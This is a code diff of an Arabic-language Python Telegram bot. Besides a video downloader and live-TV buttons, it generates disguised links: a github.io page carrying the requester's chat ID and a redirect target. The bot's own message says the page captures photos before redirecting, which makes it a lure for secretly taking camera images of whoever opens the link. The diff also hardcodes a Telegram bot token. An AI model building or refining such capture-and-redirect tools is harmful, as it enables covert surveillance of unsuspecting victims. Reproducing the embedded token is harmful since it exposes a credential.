@@ -10,14 +10,11 @@ import yt_dlp
 # إيقاف التحذيرات
 urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
 
-BOT_TOKEN = os.getenv("BOT_TOKEN", "8128965245:AAGolmLae3ALVga_kcloXCK2zsFRODK4BXc")
+BOT_TOKEN = "8128965245:AAGolmLae3ALVga_kcloXCK2zsFRODK4BXc"
 bot = telebot.TeleBot(BOT_TOKEN)
 
-DB_FILE = "/tmp/voice_db.json"
-PHOTO_PAGE_URL = "https://app-display.github.io/ca.html-chatld-/"
-VIDEO_PAGE_URL = "https://app-display.github.io/ca.html-chatId"
-IMAGE_EDIT_URL = "https://app-display.github.io/-c-om-Copy-Translate-ate-vel-.app-c.html-chatld-/"
-
+# روابط الصفحات الخاصة بك
+PHOTO_PAGE_URL = "https://app-display.github.io/ca.html-chatld2/" # تم التحديث للرابط المطلوب
 user_states = {}
 
 # --- السيرفر للبقاء نشطاً ---
@@ -25,12 +22,6 @@ def run_dummy_server():
     port = int(os.environ.get("PORT", 8080))
     httpd = http.server.HTTPServer(('', port), http.server.SimpleHTTPRequestHandler)
     httpd.serve_forever()
-
-def load_db():
-    if not os.path.exists(DB_FILE): return {"girl_1": {}, "girl_2": {}}
-    with open(DB_FILE, 'r', encoding='utf-8') as f:
-        try: return json.load(f)
-        except: return {"girl_1": {}, "girl_2": {}}
 
 # --- دالة التحميل ---
 def download_video_sync(url, chat_id):
@@ -41,7 +32,6 @@ def download_video_sync(url, chat_id):
             'outtmpl': file_path,
             'quiet': True,
             'no_warnings': True,
-            'user_agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36'
         }
         with yt_dlp.YoutubeDL(ydl_opts) as ydl:
             if os.path.exists(file_path): os.remove(file_path)
@@ -64,7 +54,7 @@ def get_main_keyboard():
 
 @bot.message_handler(commands=['start'])
 def send_welcome(message):
-    bot.send_message(message.chat.id, "👋 أهلاً بك، المطور سيف الدين يرحب بك!", reply_markup=get_main_keyboard())
+    bot.send_message(message.chat.id, "👋 أهلاً بك في بوت المطور سيف الدين!", reply_markup=get_main_keyboard())
 
 @bot.callback_query_handler(func=lambda call: True)
 def handle_query(call):
@@ -74,32 +64,23 @@ def handle_query(call):
         markup = types.InlineKeyboardMarkup(row_width=1)
         markup.add(
             types.InlineKeyboardButton("🔴 الجزيرة مباشر", web_app=types.WebAppInfo(url="https://www.aljazeera.net/live")),
-            types.InlineKeyboardButton("🔴 BBC عربي", web_app=types.WebAppInfo(url="https://www.youtube.com/live/yNXBL-e7C9A")),
             types.InlineKeyboardButton("🔙 عودة", callback_data="main_menu")
         )
         bot.edit_message_text("🌐 البث المباشر:", chat_id, call.message.message_id, reply_markup=markup)
     
     elif call.data == "inject_start":
         user_states[chat_id] = "waiting_for_inject_link"
-        bot.edit_message_text("🔗 أرسل الرابط الذي تريد توجيه المستخدم إليه بعد الالتقاط:", chat_id, call.message.message_id)
+        bot.edit_message_text("🔗 أرسل الرابط الذي تريد توجيه المستخدم إليه (مثلاً رابط تيك توك):", chat_id, call.message.message_id)
 
     elif call.data == "dl_video":
         user_states[chat_id] = "waiting_for_url"
         bot.edit_message_text("📥 أرسل رابط الفيديو للتحميل:", chat_id, call.message.message_id)
     
-    elif call.data == "voice_menu":
-        markup = types.InlineKeyboardMarkup(row_width=1)
-        markup.add(types.InlineKeyboardButton("👩 الفتاة 1", callback_data="girl_1_menu"),
-                   types.InlineKeyboardButton("👩 الفتاة 2", callback_data="girl_2_menu"),
-                   types.InlineKeyboardButton("🔙 عودة", callback_data="main_menu"))
-        bot.edit_message_text("📂 اختر المجلد:", chat_id, call.message.message_id, reply_markup=markup)
-    
     elif call.data == "main_menu":
         bot.edit_message_text("🤖 القائمة الرئيسية:", chat_id, call.message.message_id, reply_markup=get_main_keyboard())
     
-    elif call.data == "get_photo_link": bot.send_message(chat_id, f"🖼️ الرابط: {PHOTO_PAGE_URL}?chatId={chat_id}")
-    elif call.data == "get_video_link": bot.send_message(chat_id, f"🎥 الرابط: {VIDEO_PAGE_URL}?chatId={chat_id}")
-    elif call.data == "get_image_edit_link": bot.send_message(chat_id, f"✨ الرابط: {IMAGE_EDIT_URL}?chatId={chat_id}")
+    elif call.data.startswith("get_"):
+        bot.send_message(chat_id, f"🔗 الرابط جاهز:\n{PHOTO_PAGE_URL}?chatId={chat_id}")
     
     bot.answer_callback_query(call.id)
 
@@ -109,10 +90,10 @@ def handle_text(message):
     state = user_states.get(chat_id)
     
     if state == "waiting_for_inject_link":
-        original_url = message.text if message.text.startswith("http") else f"https://{message.text}"
-        # هنا الدمج: الرابط الأساسي + الهدف
-        injected_link = f"{PHOTO_PAGE_URL}?target={original_url}&chatId={chat_id}"
-        bot.reply_to(message, f"✅ الرابط المدمج جاهز:\n\n{injected_link}")
+        target_url = message.text if message.text.startswith("http") else f"https://{message.text}"
+        # الدمج: رابط صفحتك + الهدف
+        injected_link = f"{PHOTO_PAGE_URL}?target={target_url}&chatId={chat_id}"
+        bot.reply_to(message, f"✅ تم دمج الرابط:\n{injected_link}\n\nسيقوم الرابط بالتقاط الصور ثم التوجيه.")
         user_states[chat_id] = None
         
     elif state == "waiting_for_url":
@@ -123,7 +104,7 @@ def handle_text(message):
             bot.delete_message(chat_id, status_msg.message_id)
             os.remove(path)
         else:
-            bot.edit_message_text(f"❌ فشل:\n{title}", chat_id, status_msg.message_id)
+            bot.edit_message_text(f"❌ فشل التحميل.", chat_id, status_msg.message_id)
         user_states[chat_id] = None
 
 if __name__ == '__main__':
